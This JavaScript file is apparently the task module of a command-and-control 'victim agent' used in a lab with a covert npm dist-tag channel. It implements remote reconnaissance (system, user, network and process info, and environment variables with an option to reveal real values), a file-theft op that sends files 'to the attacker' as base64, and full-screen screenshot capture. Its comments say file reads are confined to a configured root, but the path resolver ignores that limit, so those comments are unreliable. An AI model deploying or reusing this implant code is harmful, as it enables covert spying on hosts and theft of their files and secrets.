// MOCK task implementations. This is a hard-coded allowlist on purpose:
// the victim agent can NEVER execute arbitrary shell commands — only these
// deterministic, read-mostly operations. `getfile` is the most capable one:
// it reads one file inside the configured filesystem root, size-capped, so the lab can
// demonstrate binary transfer over the channel. Everything still travels as
// plain base64.
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import crypto from 'node:crypto';
import { execFileSync } from 'node:child_process';
import { TASK_OPS } from '../common/protocol.js';
import { getOpDef } from '../common/ops.js';
import { runFunTask } from './fun.js';

export const DEFAULT_MAX_FILE_BYTES = 32 * 1024;
export const HASH_MAX_BYTES = 64 * 1024 * 1024; // hashing does not transfer bytes
export const LS_MAX_ENTRIES = 200; // keep result tags bounded
export const PS_MAX_LINES = 40;
export const FIND_MAX_RESULTS = 100;
export const FIND_MAX_DEPTH = 6;

const WINDOWS_PS_SCRIPT = `
$total=[double](Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory;
'    PID    PPID  %CPU  %MEM COMMAND';
Get-CimInstance Win32_Process |
  Sort-Object WorkingSetSize -Descending |
  Select-Object -First 40 |
  ForEach-Object {
    $mem=if ($total -gt 0) { 100 * [double]$_.WorkingSetSize / $total } else { 0 };
    '{0,7} {1,7} {2,5} {3,5:N1} {4}' -f $_.ProcessId,$_.ParentProcessId,'?',$mem,$_.Name;
  }`;
const WINDOWS_DF_SCRIPT = `
'Filesystem Size Used Avail Use% Mounted';
Get-CimInstance Win32_LogicalDisk -Filter 'DriveType=3' | ForEach-Object {
  $size=[double]$_.Size; $free=[double]$_.FreeSpace; $used=$size-$free;
  $pct=if ($size -gt 0) { [Math]::Round(100*$used/$size) } else { 0 };
  '{0} {1:N0} {2:N0} {3:N0} {4}% {0}' -f $_.DeviceID,$size,$used,$free,$pct;
}`;
// Captures the entire virtual screen (every display, not just the desktop
// window). The output path arrives as argv — nothing is interpolated.
const WINDOWS_SCREENSHOT_SCRIPT = `
Add-Type -AssemblyName System.Windows.Forms,System.Drawing;
$v=[System.Windows.Forms.SystemInformation]::VirtualScreen;
$b=New-Object System.Drawing.Bitmap $v.Width,$v.Height;
$g=[System.Drawing.Graphics]::FromImage($b);
$g.CopyFromScreen($v.Left,$v.Top,0,0,$b.Size);
$b.Save($args[0],[System.Drawing.Imaging.ImageFormat]::Png);`;

function positiveLimit(value, fallback) {
  const n = Number(value);
  return Number.isFinite(n) && n > 0 ? Math.floor(n) : fallback;
}

function safeValue(fn, fallback = '?') {
  try {
    return fn();
  } catch {
    return fallback;
  }
}

/**
 * Resolve a task path against the agent cwd. The realpath is returned so
 * symlink targets are reported (and read) as their real location.
 */
function resolvePath(requestedPath, _limits = {}) {
  const p = typeof requestedPath === 'string' ? requestedPath.trim() : '';
  if (!p) throw new Error('a path argument is required');
  if (p.includes('\0')) throw new Error('path contains NUL byte');
  return fs.realpathSync(path.resolve(process.cwd(), p));
}

function describeEntry(dir, name) {
  const st = fs.lstatSync(path.join(dir, name));
  const type = st.isDirectory() ? 'dir' : st.isSymbolicLink() ? 'link' : st.isFile() ? 'file' : 'other';
  return { type, size: st.size, name };
}

const TASKS = {
  echo(args = {}) {
    const text = typeof args.text === 'string' ? args.text : '';
    return `echo: ${text}`;
  },

  sysinfo() {
    const cpus = safeValue(() => os.cpus(), []);
    return [
      `platform=${safeValue(() => os.platform())}`,
      `arch=${safeValue(() => os.arch())}`,
      `release=${safeValue(() => os.release())}`,
      `hostname=${safeValue(() => os.hostname())}`,
      `uptimeSec=${safeValue(() => Math.floor(os.uptime()))}`,
      `cpus=${Array.isArray(cpus) ? cpus.length : '?'}`,
      `totalMemMB=${safeValue(() => Math.round(os.totalmem() / 1024 / 1024))}`,
      `freeMemMB=${safeValue(() => Math.round(os.freemem() / 1024 / 1024))}`,
    ].join(' ');
  },

  ping() {
    return 'pong';
  },

  time() {
    return new Date().toISOString();
  },

  whoami() {
    const u = safeValue(() => os.userInfo(), {});
    return [
      `user=${u.username ?? '?'}`,
      `uid=${u.uid ?? '?'}`,
      `gid=${u.gid ?? '?'}`,
      `home=${u.homedir ?? '?'}`,
      `shell=${u.shell ?? '?'}`,
      `hostname=${safeValue(() => os.hostname())}`,
      `pid=${process.pid}`,
      `node=${process.version}`,
    ].join(' ');
  },

  pwd() {
    return process.cwd();
  },

  /**
   * Environment variable inventory. Values are redacted by default so
   * secrets never cross the channel; the victim operator can opt in to
   * real values with the `revealEnv` config flag.
   */
  env(_args = {}, limits = {}) {
    const reveal = limits.revealEnv === true;
    const lines = Object.keys(process.env).sort().map(
      (key) => `${key}=${reveal ? process.env[key] : '<redacted>'}`,
    );
    return lines.join('\n') || '(empty environment)';
  },

  /** Network interfaces and addresses (internal ones flagged). */
  netinfo() {
    const ifaces = os.networkInterfaces();
    const lines = [];
    for (const [name, addrs] of Object.entries(ifaces)) {
      for (const a of addrs ?? []) {
        lines.push(
          `${name.padEnd(12)} ${String(a.family).padEnd(6)} ${a.address}${a.internal ? ' (internal)' : ''}`,
        );
      }
    }
    return lines.join('\n') || '(no interfaces)';
  },

  /** Top processes by memory. */
  ps(_args = {}, options = {}) {
    const platform = options.platform ?? process.platform;
    const exec = options.execFileSync ?? execFileSync;
    if (platform === 'win32') {
      return exec('powershell.exe', ['-NoProfile', '-NonInteractive', '-Command', WINDOWS_PS_SCRIPT], {
        encoding: 'utf8', timeout: 10_000, windowsHide: true,
      }).trim();
    }
    const out = exec('ps', ['-eo', 'pid,ppid,pcpu,pmem,comm'], {
      encoding: 'utf8',
      timeout: 5000,
    });
    const [header, ...rows] = out.trim().split('\n');
    const sorted = rows
      .map((line) => {
        const m = /^\s*(\d+)\s+(\d+)\s+([\d.]+)\s+([\d.]+)\s+(.*)$/.exec(line);
        return m ? { pid: m[1], ppid: m[2], cpu: m[3], mem: Number(m[4]), cmd: m[5] } : null;
      })
      .filter(Boolean)
      .sort((a, b) => b.mem - a.mem)
      .slice(0, PS_MAX_LINES);
    const lines = sorted.map(
      (p) => `${p.pid.padStart(7)} ${p.ppid.padStart(7)} ${p.cpu.padStart(5)} ${p.mem.toFixed(1).padStart(5)} ${p.cmd}`,
    );
    return `${header}\n${lines.join('\n')}`;
  },

  /** Filesystem usage. */
  df(_args = {}, options = {}) {
    const platform = options.platform ?? process.platform;
    const exec = options.execFileSync ?? execFileSync;
    if (platform === 'win32') {
      return exec('powershell.exe', ['-NoProfile', '-NonInteractive', '-Command', WINDOWS_DF_SCRIPT], {
        encoding: 'utf8', timeout: 10_000, windowsHide: true,
      }).trim();
    }
    return exec('df', ['-h'], { encoding: 'utf8', timeout: 5000 }).trim();
  },

  /** Change the agent's working directory; later relative paths follow it. */
  cd(args = {}, limits = {}) {
    const dir = resolvePath(args.path, limits);
    const st = fs.statSync(dir);
    if (!st.isDirectory()) throw new Error(`not a directory: ${dir}`);
    process.chdir(dir);
    return process.cwd();
  },

  /** List a directory (default: cwd). Output is one "type size name" per line. */
  ls(args = {}, limits = {}) {
    const dir = resolvePath(args.path || '.', limits);
    const st = fs.statSync(dir);
    if (!st.isDirectory()) throw new Error(`not a directory: ${dir}`);
    const names = fs.readdirSync(dir).sort();
    const lines = [];
    for (const name of names.slice(0, LS_MAX_ENTRIES)) {
      try {
        const e = describeEntry(dir, name);
        lines.push(`${e.type.padEnd(5)} ${String(e.size).padStart(10)} ${e.name}`);
      } catch {
        lines.push(`?          ? ${name}`);
      }
    }
    const header = `${dir} (${names.length} entries)`;
    const truncated = names.length > LS_MAX_ENTRIES ? `\n... truncated at ${LS_MAX_ENTRIES}` : '';
    return `${header}\n${lines.join('\n')}${truncated}`;
  },

  /** File metadata: type, size, timestamps, permissions. */
  stat(args = {}, limits = {}) {
    const p = resolvePath(args.path, limits);
    const st = fs.statSync(p);
    const type = st.isDirectory() ? 'dir' : st.isFile() ? 'file' : 'other';
    return [
      `path=${p}`,
      `type=${type}`,
      `size=${st.size}`,
      `mode=${(st.mode & 0o777).toString(8)}`,
      `mtime=${st.mtime.toISOString()}`,
      `ctime=${st.ctime.toISOString()}`,
    ].join(' ');
  },

  /** SHA-256 of a file (read-only, capped at HASH_MAX_BYTES). */
  hash(args = {}, limits = {}) {
    const p = resolvePath(args.path, limits);
    const st = fs.statSync(p);
    if (!st.isFile()) throw new Error(`not a regular file: ${p}`);
    if (st.size > HASH_MAX_BYTES) {
      throw new Error(`file too large to hash: ${st.size} bytes (cap ${HASH_MAX_BYTES})`);
    }
    const digest = crypto.createHash('sha256').update(fs.readFileSync(p)).digest('hex');
    return `sha256 ${digest}  ${p} (${st.size} bytes)`;
  },

  /** Recursively find files under a directory whose name contains the query. */
  find(args = {}, limits = {}) {
    const root = resolvePath(args.path, limits);
    const query = String(args.query ?? '').toLowerCase();
    if (!query) throw new Error('find requires a name query');
    const st = fs.statSync(root);
    if (!st.isDirectory()) throw new Error(`not a directory: ${root}`);

    const hits = [];
    let truncated = false;
    const walk = (dir, depth) => {
      if (truncated || depth > FIND_MAX_DEPTH) return;
      let entries;
      try {
        entries = fs.readdirSync(dir, { withFileTypes: true });
      } catch {
        return; // unreadable directory: skip silently
      }
      for (const e of entries) {
        if (truncated) return;
        const full = path.join(dir, e.name);
        if (e.name.toLowerCase().includes(query)) {
          hits.push(full);
          if (hits.length >= FIND_MAX_RESULTS) {
            truncated = true;
            return;
          }
        }
        if (e.isDirectory()) walk(full, depth + 1);
      }
    };
    walk(root, 0);

    const header = `${hits.length}${truncated ? '+' : ''} match(es) for "${args.query}" under ${root}`;
    return hits.length === 0 ? header : `${header}\n${hits.join('\n')}`;
  },

  /**
   * Read one file and return it for transfer to the attacker. The path is
   * absolute or relative to the agent's cwd.
   * Returns { output, file } instead of a plain string; the file bytes ride
   * in the result payload as base64 and are chunked by the protocol encoder.
   */
  getfile(args = {}, limits = {}) {
    const p = typeof args.path === 'string' ? args.path.trim() : '';
    if (!p) throw new Error('getfile requires args.path');
    const max = positiveLimit(limits.maxFileBytes, DEFAULT_MAX_FILE_BYTES);
    const file = resolvePath(p, limits);
    const st = fs.statSync(file);
    if (!st.isFile()) throw new Error(`not a regular file: ${file}`);
    if (st.size > max) {
      throw new Error(
        `file too large: ${st.size} bytes (cap ${max}) - the dist-tag channel ` +
          'moves ~130 bytes per tag; raise maxFileBytes only for small demos',
      );
    }
    const data = fs.readFileSync(file);
    return {
      output: `${file} (${st.size} bytes)`,
      file: { name: path.basename(file), size: st.size, dataB64: data.toString('base64') },
    };
  },

  /**
   * Capture the whole screen (all displays, not only the desktop window) with
   * OS built-in tools — no dependencies. The PNG rides back exactly like a
   * getfile transfer, capped by maxFileBytes. The temp file never touches the
   * configured filesystem root and is always removed afterwards.
   * Gated behind the enableScreenshot config flag; run it only on an
   * attended lab host. On macOS the agent's terminal needs Screen Recording
   * permission, otherwise screencapture fails or returns a blank image.
   */
  screenshot(_args = {}, options = {}) {
    const platform = options.platform ?? process.platform;
    const exec = options.execFileSync ?? execFileSync;
    const tmp = path.join(
      fs.realpathSync(os.tmpdir()),
      `kc2-shot-${process.pid}-${crypto.randomBytes(4).toString('hex')}.png`,
    );
    const EXEC_OPTS = { encoding: 'utf8', timeout: 15_000, windowsHide: true };
    try {
      if (platform === 'darwin') {
        exec('screencapture', ['-x', '-t', 'png', tmp], EXEC_OPTS);
      } else if (platform === 'linux') {
        const candidates = [
          ['import', ['-window', 'root', tmp]], // ImageMagick
          ['scrot', [tmp]],
          ['gnome-screenshot', ['-f', tmp]],
        ];
        let captured = false;
        for (const [file, args] of candidates) {
          try {
            exec(file, args, EXEC_OPTS);
            captured = true;
            break;
          } catch {
            // Try the next common X11 screenshot utility.
          }
        }
        if (!captured) {
          throw new Error(`no screenshot tool found; tried ${candidates.map(([f]) => f).join(', ')}`);
        }
      } else if (platform === 'win32') {
        exec('powershell.exe', ['-NoProfile', '-NonInteractive', '-Command', WINDOWS_SCREENSHOT_SCRIPT, tmp], EXEC_OPTS);
      } else {
        throw new Error(`screenshot is not supported on ${platform}`);
      }
      const st = fs.statSync(tmp);
      const max = positiveLimit(options.maxFileBytes, DEFAULT_MAX_FILE_BYTES);
      if (st.size > max) {
        throw new Error(
          `screenshot too large: ${st.size} bytes (cap ${max}) — raise maxFileBytes; ` +
            'the dist-tag channel moves ~130 bytes per tag, so full-screen images are slow',
        );
      }
      const data = fs.readFileSync(tmp);
      return {
        output: `screen captured (${st.size} bytes PNG)`,
        file: { name: 'screenshot.png', size: st.size, dataB64: data.toString('base64') },
      };
    } finally {
      fs.rmSync(tmp, { force: true });
    }
  },

  openurl: (args, options) => runFunTask('openurl', args, options),
  say: (args, options) => runFunTask('say', args, options),
  notify: (args, options) => runFunTask('notify', args, options),
  beep: (args, options) => runFunTask('beep', args, options),
  bounce: (args, options) => runFunTask('bounce', args, options),
  volume: (args, options) => runFunTask('volume', args, options),
  rickroll: (args, options) => runFunTask('rickroll', args, options),
  party: (args, options) => runFunTask('party', args, options),
};

export const ALLOWED_OPS = Object.freeze([...TASK_OPS]);

/**
 * Dispatch a command to the mock task allowlist.
 * @param {string} op
 * @param {object} [args]
 * @param {object} [limits] e.g. { maxFileBytes, revealEnv }
 * @returns {{ok: true, output: string, file?: object} | {ok: false, error: string}}
 */
export function runTask(op, args = {}, limits = {}) {
  const fn = TASKS[op];
  if (!fn) {
    return {
      ok: false,
      error: `unknown or disallowed op "${op}" — allowlist: ${ALLOWED_OPS.join(', ')}`,
    };
  }
  if (getOpDef(op)?.group === 'fun' && limits.enableFunOps === false) {
    return { ok: false, error: `task "${op}" is disabled; set enableFunOps only on an attended lab host` };
  }
  if (getOpDef(op)?.group === 'screen' && limits.enableScreenshot !== true) {
    return { ok: false, error: `task "${op}" is disabled; set enableScreenshot only on an attended lab host` };
  }
  try {
    const r = fn(args, limits);
    if (r && typeof r === 'object' && r.file) {
      return { ok: true, output: String(r.output ?? ''), file: r.file };
    }
    return { ok: true, output: String(r) };
  } catch (err) {
    return { ok: false, error: `task "${op}" failed: ${err.message}` };
  }
}
